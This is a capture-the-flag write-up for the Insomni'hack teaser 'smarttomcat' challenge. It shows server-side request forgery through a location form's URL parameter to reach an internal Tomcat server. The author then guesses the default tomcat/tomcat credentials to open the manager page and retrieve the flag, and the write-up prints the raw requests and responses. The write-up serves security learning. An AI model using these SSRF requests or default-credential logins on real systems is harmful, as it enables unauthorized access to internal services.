>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot
Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ?
[Search interface](http://smarttomcat.teaser.insomnihack.ch/)

This is a simple challenge.

We have a web application to locate places from coordinates. A standard request would look like this:

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch

u=http://localhost:8080/index.jsp?x=1%26y=2
```

We try

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch

u=http://localhost:8080/zzz
```
and got: 

```
<html><head><title>Apache Tomcat/7.0.68 (Ubuntu) - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /zzz</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/zzz</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.68 (Ubuntu)</h3></body></html>
```

Now let's try to read the contents of the Manager page

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch

u=http://localhost:8080/manager/html
```

The response is

```
<html><head><title>Apache Tomcat/7.0.68 (Ubuntu) - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 401 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>This request requires HTTP authentication.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.68 (Ubuntu)</h3></body></html>
```

This application requires login, we know that tomcat uses the basic authent and the credential can be [passed in URL] (http://serverfault.com/questions/371907/can-you-pass-user-pass-for- http-basic-authentication-in-url-parameters). With a little luck, I guess the account is `tomcat / tomcat`

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch

u=http://tomcat:tomcat@localhost:8080/manager/html
```

and we got the flag

```
We won't give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}
```

